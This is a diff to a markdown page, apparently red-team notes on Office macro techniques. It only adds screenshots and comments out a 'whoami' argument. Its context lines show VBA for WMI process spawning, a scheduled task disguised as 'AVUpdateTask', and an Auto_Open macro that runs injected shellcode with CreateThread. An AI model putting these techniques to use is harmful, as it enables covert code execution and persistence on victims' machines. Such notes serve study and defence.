@@ -18,6 +18,8 @@ errReturn = objProcess.Create("calc", Null, objConfig, intProcessID)
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
+![](../../.gitbook/assets/screenshot-from-2019-04-10-22-11-41.png)
+
 ## Spawning via ShellCOM
 
 {% code-tabs %}
@@ -78,11 +80,13 @@ trigger.StartBoundary = startTime
 trigger.ID = "TimeTriggerId"
 Dim Action: Set Action = td.Actions.Create(0)
 Action.Path = "C:\Windows\System32\cmd.exe"
-Action.Arguments = "/c whoami"
+'Action.Arguments = "/c whoami"
 Call service.GetFolder("\").RegisterTaskDefinition("AVUpdateTask", td, 6, , , 3)
 ```
 {% endcode-tabs-item %}
 {% endcode-tabs %}
+
+![](../../.gitbook/assets/screenshot-from-2019-04-10-22-19-03.png)
 
 ## Shellcode injection to Memory
 
@@ -119,6 +123,10 @@ Sub Auto_Open()
         Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)
 End Sub
 ```
+
+![](../../.gitbook/assets/peek-2019-04-10-22-35.gif)
+
+![TCP session from Excel.exe](../../.gitbook/assets/screenshot-from-2019-04-10-22-36-03.png)
 
 ## References
 
